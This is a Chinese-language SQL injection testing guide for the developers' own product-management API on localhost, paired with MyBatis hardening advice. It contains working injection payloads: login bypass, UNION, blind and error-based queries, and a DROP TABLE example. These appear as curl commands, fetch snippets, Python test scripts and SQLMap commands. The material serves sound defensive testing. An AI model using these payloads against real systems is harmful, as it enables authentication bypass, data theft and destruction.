# SQL注入测试指南

## 概述

本文档说明如何对商品管理系统进行SQL注入测试，帮助发现和修复潜在的安全漏洞。

## 系统架构

- **后端**: Spring Boot + MyBatis
- **数据库**: MySQL
- **主要接口**: 
  - `POST /api/auth/login` - 管理员登录
  - `GET /api/auth/check` - 检查登录状态
  - `POST /api/auth/logout` - 退出登录
  - `GET /api/product/list` - 查询所有商品
  - `GET /api/product/{id}` - 根据ID查询
  - `GET /api/product/search?name=xxx` - 根据名称查询
  - `POST /api/product` - 添加商品
  - `DELETE /api/product/{id}` - 删除商品

## SQL注入测试方法

### 1. 登录接口测试（高风险注入点）

**接口**: `POST /api/auth/login`

**⚠️ 当前实现说明**: 
当前系统使用**硬编码验证**（admin/root），不涉及数据库查询，因此**当前不存在SQL注入风险**。

```java
// 当前实现（安全，无SQL注入风险）
if (ADMIN_USERNAME.equals(username) && ADMIN_PASSWORD.equals(password)) {
    // 登录成功
}
```

**重要提示**: 
如果未来将登录验证改为从数据库查询用户信息，登录接口将成为**最高风险**的SQL注入点。以下测试用例适用于**未来改为数据库验证**的场景，建议在开发时提前进行测试，确保使用参数化查询。

#### 假设场景：如果使用数据库验证用户

如果登录验证改为从数据库查询用户信息，以下测试用例可以帮助发现SQL注入漏洞：

#### 测试用例 1: 用户名注入测试

```bash
# 基础OR注入 - 绕过密码验证
curl -X POST "http://localhost:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"任意密码"}'

# 使用注释绕过
curl -X POST "http://localhost:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' -- ","password":"任意密码"}'

# UNION注入尝试
curl -X POST "http://localhost:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' UNION SELECT NULL,NULL -- ","password":"任意密码"}'
```

#### 测试用例 2: 密码注入测试

```bash
# 密码字段注入
curl -X POST "http://localhost:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"'\'' OR '\''1'\''='\''1"}'

# 密码字段注释绕过
curl -X POST "http://localhost:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"'\'' OR 1=1 -- "}'
```

#### 测试用例 3: 布尔盲注测试

```bash
# 测试真条件
curl -X POST "http://localhost:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' AND 1=1 -- ","password":"test"}'

# 测试假条件
curl -X POST "http://localhost:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' AND 1=2 -- ","password":"test"}'
```

#### 测试用例 4: 时间盲注测试

```bash
# 测试时间延迟
curl -X POST "http://localhost:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' AND SLEEP(5) -- ","password":"test"}'

# 条件时间盲注
curl -X POST "http://localhost:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' AND IF(1=1,SLEEP(5),0) -- ","password":"test"}'
```

#### 测试用例 5: 错误注入测试

```bash
# 尝试触发数据库错误以获取信息
curl -X POST "http://localhost:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) -- ","password":"test"}'
```

#### 测试用例 6: 使用浏览器开发者工具

```javascript
// 在浏览器控制台执行
fetch('/api/auth/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  credentials: 'include',
  body: JSON.stringify({
    username: "admin' OR '1'='1",
    password: "任意密码"
  })
})
.then(res => res.json())
.then(data => {
  console.log('响应:', data);
  if (data.success) {
    console.warn('⚠️ 可能存在SQL注入漏洞！登录成功');
  }
})

// 测试时间盲注
const start = Date.now();
fetch('/api/auth/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  credentials: 'include',
  body: JSON.stringify({
    username: "admin' AND SLEEP(5) -- ",
    password: "test"
  })
})
.then(() => {
  const time = Date.now() - start;
  console.log('响应时间:', time, 'ms');
  if (time > 4000) {
    console.warn('⚠️ 响应时间异常，可能存在时间盲注漏洞！');
  }
})
```

#### 测试用例 7: 使用 Postman 测试

1. 创建新请求
2. 方法设置为 `POST`
3. URL: `http://localhost:8080/api/auth/login`
4. Headers: `Content-Type: application/json`
5. Body (raw JSON):
   ```json
   {
     "username": "admin' OR '1'='1",
     "password": "任意密码"
   }
   ```
6. 发送请求并观察响应

#### 预期结果

- **如果存在漏洞**: 
  - 使用 `' OR '1'='1` 可能成功登录
  - 响应时间异常（时间盲注）
  - 返回数据库错误信息（错误注入）

- **如果已防护**: 
  - 返回401未授权
  - 返回通用错误信息
  - 正常响应时间

#### 登录接口SQL注入自动化测试脚本

```python
import requests
import time
import json

BASE_URL = "http://localhost:8080/api/auth"

# 登录接口测试用例
login_test_cases = [
    # 用户名注入
    ({"username": "admin' OR '1'='1", "password": "test"}, "用户名OR注入"),
    ({"username": "admin' OR '1'='1' -- ", "password": "test"}, "用户名OR注入(注释)"),
    ({"username": "admin' OR '1'='1' #", "password": "test"}, "用户名OR注入(MySQL注释)"),
    ({"username": "' OR '1'='1", "password": "test"}, "用户名OR注入(无前缀)"),
    
    # 密码注入
    ({"username": "admin", "password": "' OR '1'='1"}, "密码OR注入"),
    ({"username": "admin", "password": "' OR '1'='1' -- "}, "密码OR注入(注释)"),
    
    # UNION注入
    ({"username": "admin' UNION SELECT NULL,NULL -- ", "password": "test"}, "用户名UNION注入"),
    
    # 布尔盲注
    ({"username": "admin' AND 1=1 -- ", "password": "test"}, "用户名布尔盲注(真)"),
    ({"username": "admin' AND 1=2 -- ", "password": "test"}, "用户名布尔盲注(假)"),
    
    # 时间盲注
    ({"username": "admin' AND SLEEP(5) -- ", "password": "test"}, "用户名时间盲注"),
    ({"username": "admin' AND IF(1=1,SLEEP(5),0) -- ", "password": "test"}, "用户名条件时间盲注"),
    
    # 错误注入
    ({"username": "admin' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) -- ", "password": "test"}, "用户名错误注入"),
]

def test_login_injection(payload, description):
    """测试登录接口SQL注入"""
    url = f"{BASE_URL}/login"
    
    print(f"\n测试: {description}")
    print(f"Payload: {json.dumps(payload, ensure_ascii=False)}")
    
    try:
        start_time = time.time()
        response = requests.post(
            url, 
            json=payload,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        elapsed_time = time.time() - start_time
        
        print(f"状态码: {response.status_code}")
        print(f"响应时间: {elapsed_time:.2f}秒")
        
        try:
            data = response.json()
            print(f"响应数据: {data}")
            
            # 检查是否成功登录（如果存在漏洞）
            if data.get('success') == True:
                print("⚠️  严重警告: 可能存在SQL注入漏洞！登录成功！")
            elif elapsed_time > 4:
                print("⚠️  警告: 响应时间异常，可能存在时间盲注漏洞！")
        except:
            print(f"响应文本: {response.text[:200]}")
            
    except requests.exceptions.Timeout:
        print("⚠️  请求超时，可能存在时间盲注漏洞！")
    except Exception as e:
        print(f"错误: {e}")

if __name__ == "__main__":
    print("=" * 60)
    print("登录接口SQL注入测试")
    print("=" * 60)
    print("\n注意: 当前系统使用硬编码验证，不涉及数据库查询")
    print("此测试适用于未来改为数据库验证的情况\n")
    
    for payload, description in login_test_cases:
        test_login_injection(payload, description)
        time.sleep(1)  # 避免请求过快
    
    print("\n" + "=" * 60)
    print("测试完成")
    print("=" * 60)
```

### 2. 名称查询接口测试（最可能的注入点）

**接口**: `GET /api/product/search?name=xxx`

#### 测试用例 1: 基础注入测试

```bash
# 使用 curl 测试
curl "http://localhost:8080/api/product/search?name=' OR '1'='1"
curl "http://localhost:8080/api/product/search?name=' OR '1'='1' -- "
curl "http://localhost:8080/api/product/search?name=' OR '1'='1' #"
```

**预期结果**: 
- 如果存在漏洞，可能返回所有商品或第一个商品
- 如果已防护，应该返回404或空结果

#### 测试用例 2: 联合查询注入

```bash
# 测试 UNION 注入
curl "http://localhost:8080/api/product/search?name=' UNION SELECT NULL,NULL,NULL,NULL -- "
curl "http://localhost:8080/api/product/search?name=' UNION SELECT 1,2,3,4 -- "
```

#### 测试用例 3: 布尔盲注

```bash
# 测试布尔盲注
curl "http://localhost:8080/api/product/search?name=' AND 1=1 -- "
curl "http://localhost:8080/api/product/search?name=' AND 1=2 -- "
```

#### 测试用例 4: 时间盲注

```bash
# 测试时间延迟注入
curl "http://localhost:8080/api/product/search?name=' AND SLEEP(5) -- "
curl "http://localhost:8080/api/product/search?name=' AND IF(1=1,SLEEP(5),0) -- "
```

#### 测试用例 5: 错误注入

```bash
# 测试错误信息泄露
curl "http://localhost:8080/api/product/search?name=' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) -- "
```

### 3. ID查询接口测试

**接口**: `GET /api/product/{id}`

#### 测试用例

```bash
# 基础注入
curl "http://localhost:8080/api/product/1' OR '1'='1"
curl "http://localhost:8080/api/product/1' UNION SELECT NULL,NULL,NULL,NULL -- "

# 时间盲注
curl "http://localhost:8080/api/product/1' AND SLEEP(5) -- "
```

### 4. 前端测试方法

在浏览器中直接修改URL或使用开发者工具：

#### 方法1: 修改URL参数

```
http://localhost:3000/api/product/search?name=' OR '1'='1
http://localhost:3000/api/product/search?name=' UNION SELECT 1,2,3,4 --
```

#### 方法2: 使用浏览器控制台

```javascript
// 在浏览器控制台执行
fetch('/api/product/search?name=\' OR \'1\'=\'1')
  .then(res => res.json())
  .then(data => console.log(data))

// 测试时间盲注
const start = Date.now()
fetch('/api/product/search?name=\' AND SLEEP(5) -- ')
  .then(() => {
    const time = Date.now() - start
    console.log('响应时间:', time, 'ms')
  })
```

#### 方法3: 使用 Postman 或类似工具

1. 创建新请求
2. 设置方法为 GET
3. URL: `http://localhost:8080/api/product/search`
4. 参数: `name` = `' OR '1'='1`
5. 发送请求并观察响应

### 5. 自动化测试脚本

#### Python 测试脚本

```python
import requests
import time

BASE_URL = "http://localhost:8080/api/product"

# 测试用例列表
test_cases = [
    # 基础注入
    ("' OR '1'='1", "基础OR注入"),
    ("' OR '1'='1' -- ", "基础OR注入(注释)"),
    ("' OR '1'='1' #", "基础OR注入(MySQL注释)"),
    
    # UNION注入
    ("' UNION SELECT NULL,NULL,NULL,NULL -- ", "UNION注入测试"),
    ("' UNION SELECT 1,2,3,4 -- ", "UNION注入(列数测试)"),
    
    # 布尔盲注
    ("' AND 1=1 -- ", "布尔盲注(真)"),
    ("' AND 1=2 -- ", "布尔盲注(假)"),
    
    # 时间盲注
    ("' AND SLEEP(5) -- ", "时间盲注"),
    ("' AND IF(1=1,SLEEP(5),0) -- ", "条件时间盲注"),
]

def test_sql_injection(payload, description):
    """测试SQL注入"""
    url = f"{BASE_URL}/search"
    params = {"name": payload}
    
    print(f"\n测试: {description}")
    print(f"Payload: {payload}")
    
    try:
        start_time = time.time()
        response = requests.get(url, params=params, timeout=10)
        elapsed_time = time.time() - start_time
        
        print(f"状态码: {response.status_code}")
        print(f"响应时间: {elapsed_time:.2f}秒")
        
        if response.status_code == 200:
            data = response.json()
            print(f"响应数据: {data}")
            if isinstance(data, list) and len(data) > 1:
                print("⚠️  警告: 可能存在SQL注入漏洞！返回了多条记录")
            elif elapsed_time > 4:
                print("⚠️  警告: 响应时间异常，可能存在时间盲注漏洞！")
        else:
            print(f"响应: {response.text[:200]}")
            
    except requests.exceptions.Timeout:
        print("⚠️  请求超时，可能存在时间盲注漏洞！")
    except Exception as e:
        print(f"错误: {e}")

if __name__ == "__main__":
    print("=" * 60)
    print("SQL注入测试开始")
    print("=" * 60)
    
    for payload, description in test_cases:
        test_sql_injection(payload, description)
        time.sleep(1)  # 避免请求过快
    
    print("\n" + "=" * 60)
    print("测试完成")
    print("=" * 60)
```

#### 运行测试脚本

```bash
# 安装依赖
pip install requests

# 运行测试
python sql_injection_test.py
```

## 当前系统的防护情况

### MyBatis 参数化查询

当前系统使用 MyBatis，如果正确使用参数化查询，应该能够防护大部分SQL注入。

**检查点**:

1. **ProductMapper.xml** - 检查是否使用 `#{}` 而不是 `${}`

```xml
<!-- ✅ 安全 - 使用 #{} 参数化查询 -->
<select id="selectByName" parameterType="String" resultMap="ProductResultMap">
    SELECT id, name, price, description
    FROM product
    WHERE name = #{name}  <!-- 安全 -->
    LIMIT 1
</select>

<!-- ❌ 危险 - 使用 ${} 字符串拼接 -->
<select id="selectByName" parameterType="String" resultMap="ProductResultMap">
    SELECT id, name, price, description
    FROM product
    WHERE name = '${name}'  <!-- 危险！存在SQL注入风险 -->
    LIMIT 1
</select>
```

2. **Controller层** - 检查参数验证

```java
// ✅ 当前实现 - 有基本验证
@GetMapping("/search")
public ResponseEntity<ProductEntity> getProductByName(@RequestParam String name) {
    if (name == null || name.trim().isEmpty()) {
        return ResponseEntity.status(HttpStatus.BAD_REQUEST).build();
    }
    // ...
}
```

## 潜在风险点

### 1. 登录接口（如果改为数据库验证）

**风险等级**: 🔴 **极高**

如果未来将登录验证改为从数据库查询用户信息，登录接口将成为**最高风险**的注入点，因为：

- 攻击者可以通过SQL注入绕过身份验证
- 可能获取管理员权限
- 可能导致整个系统被攻破

**潜在攻击场景**:

```sql
-- 如果SQL语句类似这样（危险示例）:
SELECT * FROM users WHERE username = '${username}' AND password = '${password}'

-- 攻击者输入:
username: admin' OR '1'='1
password: 任意值

-- 实际执行的SQL:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '任意值'
-- 这会返回所有用户或第一个用户，导致绕过验证
```

**防护措施**（如果改为数据库验证）:

1. **必须使用参数化查询**:
   ```java
   // ✅ 安全
   @Select("SELECT * FROM users WHERE username = #{username} AND password = #{password}")
   User findByUsernameAndPassword(@Param("username") String username, @Param("password") String password);
   
   // ❌ 危险
   @Select("SELECT * FROM users WHERE username = '${username}' AND password = '${password}'")
   User findByUsernameAndPassword(@Param("username") String username, @Param("password") String password);
   ```

2. **密码加密存储**:
   ```java
   // 使用BCrypt等加密算法，不要存储明文密码
   String hashedPassword = BCrypt.hashpw(password, BCrypt.gensalt());
   ```

3. **输入验证**:
   ```java
   // 验证用户名格式
   if (!username.matches("^[a-zA-Z0-9_]{3,20}$")) {
       return ResponseEntity.status(HttpStatus.BAD_REQUEST).build();
   }
   ```

4. **限制登录尝试次数**:
   ```java
   // 防止暴力破解
   if (loginAttempts > 5) {
       // 锁定账户或要求验证码
   }
   ```

### 2. 名称查询接口

**风险等级**: 🟡 中等

如果 MyBatis 配置错误使用了 `${}`，以下输入可能导致注入：

```
' OR '1'='1
' UNION SELECT * FROM user --
'; DROP TABLE product; --
```

### 3. ID查询接口

**风险等级**: 🟢 低

Spring Boot 会自动将路径参数转换为 Long 类型，如果转换失败会返回400错误，相对安全。

### 4. POST请求体

**风险等级**: 🟢 低

JSON反序列化通常会自动转义特殊字符。

## 防护建议

### 1. 确保使用参数化查询

```xml
<!-- ✅ 正确 -->
WHERE name = #{name}

<!-- ❌ 错误 -->
WHERE name = '${name}'
```

### 2. 输入验证和过滤

```java
@GetMapping("/search")
public ResponseEntity<ProductEntity> getProductByName(@RequestParam String name) {
    // 验证输入
    if (name == null || name.trim().isEmpty()) {
        return ResponseEntity.status(HttpStatus.BAD_REQUEST).build();
    }
    
    // 过滤危险字符
    if (name.matches(".*[;'\"\\\\].*")) {
        return ResponseEntity.status(HttpStatus.BAD_REQUEST).build();
    }
    
    // 限制长度
    if (name.length() > 100) {
        return ResponseEntity.status(HttpStatus.BAD_REQUEST).build();
    }
    
    ProductEntity product = service.getByName(name.trim());
    // ...
}
```

### 3. 使用白名单验证

```java
// 只允许字母、数字、中文和常见标点
if (!name.matches("^[\\u4e00-\\u9fa5a-zA-Z0-9\\s\\-_.]+$")) {
    return ResponseEntity.status(HttpStatus.BAD_REQUEST).build();
}
```

### 4. 使用预编译语句（MyBatis已自动处理）

MyBatis 默认使用 PreparedStatement，会自动处理参数转义。

### 5. 最小权限原则

数据库用户应该只有必要的权限，不要使用 root 用户。

### 6. 错误处理

不要向客户端暴露详细的数据库错误信息：

```java
@ControllerAdvice
public class GlobalExceptionHandler {
    
    @ExceptionHandler(Exception.class)
    public ResponseEntity<String> handleException(Exception e) {
        // 记录详细错误到日志
        log.error("Error occurred", e);
        
        // 只返回通用错误信息给客户端
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
            .body("服务器内部错误");
    }
}
```

### 7. 使用 WAF (Web Application Firewall)

在生产环境中部署 WAF 来拦截恶意请求。

## 测试检查清单

### 登录接口测试
- [ ] 测试用户名字段的所有注入方式
- [ ] 测试密码字段的所有注入方式
- [ ] 测试布尔盲注
- [ ] 测试时间盲注
- [ ] 测试错误注入
- [ ] 验证登录失败次数限制
- [ ] 检查是否使用参数化查询（如果改为数据库验证）

### 其他接口测试
- [ ] 测试名称查询接口的所有注入方式
- [ ] 测试ID查询接口
- [ ] 检查 MyBatis XML 是否使用 `#{}`
- [ ] 验证输入验证是否生效
- [ ] 检查错误信息是否泄露敏感信息
- [ ] 测试特殊字符处理
- [ ] 验证数据库用户权限

## 工具推荐

1. **SQLMap** - 自动化SQL注入工具
   ```bash
   # 测试登录接口（如果改为数据库验证）
   sqlmap -u "http://localhost:8080/api/auth/login" \
     --data='{"username":"admin","password":"test"}' \
     --method=POST \
     --headers="Content-Type: application/json" \
     --batch
   
   # 测试商品查询接口
   sqlmap -u "http://localhost:8080/api/product/search?name=test" --batch
   ```

2. **Burp Suite** - Web安全测试工具

3. **OWASP ZAP** - 开源安全测试工具

## 注意事项

⚠️ **重要**: 
- 只在自己的开发环境或授权的测试环境中进行测试
- 不要在生产环境进行SQL注入测试
- 测试前备份数据库
- 遵守法律法规和道德准则

## 参考资源

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [MyBatis SQL Injection Prevention](https://mybatis.org/mybatis-3/sqlmap-xml.html)
- [Spring Security SQL Injection](https://spring.io/guides/topicals/spring-security-architecture)
